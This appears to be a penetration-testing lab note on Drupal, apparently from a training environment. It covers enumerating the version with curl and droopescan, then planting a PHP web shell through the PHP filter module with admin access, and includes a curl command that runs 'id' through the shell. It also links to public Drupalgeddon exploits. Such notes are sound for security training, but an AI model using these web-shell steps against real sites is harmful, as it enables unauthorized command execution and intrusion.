# Enumeration
Getting the running version of Drupal manually:
`curl -s http://drupal.inlanefreight.local | grep Drupal`
or via nodes
`curl -s http://drupal.inlanefreight.local/nodes/1 | grep Drupal`
or via Change-log
`curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""`


Automatically(preferred)
`droopescan scan drupal -u http://drupal.inlanefreight.local`


# Attacks
### Inject PHP web-shell (version before 8).
1. Connect to portal as admin
2. Enable PHP filter from Modules
3. Add new Content -- Basic Page
4. Inject the desired PHP Webpage
5. Save as PHP Text format
6. Invoke the post from /nodes/ID ex: 
7. `curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"`


### Inject PHP web-shell (version after 8).
The method is pretty much the same but on 8 and onwards PHP filter is missing to you have to import it manually first.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Install the plugin: Administration > Reports > Available updates.
3. Enable it
4. Follow the steps from before


### Other exotic CVEs
https://www.exploit-db.com/exploits/34992 
(PHP Filters needs to be on)
https://www.exploit-db.com/exploits/34992
(Another variant of the first one)
https://github.com/rithchard/Drupalgeddon3
(User must have permissions to ADD/DELETE nodes)